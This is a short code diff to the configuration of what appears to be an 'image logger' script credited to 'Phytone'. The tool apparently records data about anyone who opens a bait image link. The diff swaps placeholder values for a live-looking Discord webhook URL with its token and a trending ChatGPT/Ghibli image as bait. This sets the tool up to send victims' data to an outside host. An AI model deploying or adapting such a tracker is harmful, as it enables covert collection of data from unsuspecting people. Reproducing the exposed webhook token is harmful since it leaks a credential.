@@ -9,8 +9,8 @@ __author__ = "Phytone"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1360213557873999902/lfAhaXX7gEtQYBVcFxCP-xcazCzY8zvvPDzB9HPY_Pi269fszAWK_Z4ab1JuSBiov743",
+    "image": "https://resize.indiatvnews.com/en/resize/newbucket/1200_-/2025/03/internet-becomes-chatgpt-s-studio-ghibli-inspired-playground-elon-musk-joins-trend-1743069943.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
